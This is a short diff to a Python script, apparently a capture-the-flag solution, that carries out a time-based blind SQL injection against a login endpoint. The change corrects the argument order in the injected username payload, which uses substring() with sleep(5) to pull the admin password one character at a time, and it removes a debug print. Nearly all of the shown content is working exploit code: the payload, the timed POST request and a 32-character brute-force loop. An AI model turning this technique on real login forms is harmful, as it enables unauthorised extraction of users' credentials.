@@ -7,11 +7,9 @@ def login(n, ch):
     url = 'https://uw2017.p4.team/blindoracle'
 
     data = {
-        'username': "admin' and substring((SELECT password FROM users WHERE username='admin'), {}, 1) = '{}' and sleep(5)#".format(ch, n),
+        'username': "admin' and substring((SELECT password FROM users WHERE username='admin'), {}, 1) = '{}' and sleep(5)#".format(n, ch),
         'password': 'fdsfasd'
     }
-
-    # print(data)
 
     try:
         resp = sess.post(url, data=data, timeout=2)
@@ -29,4 +27,3 @@ for i in range(1, 33):
             result += c
             print(result)
             break
-
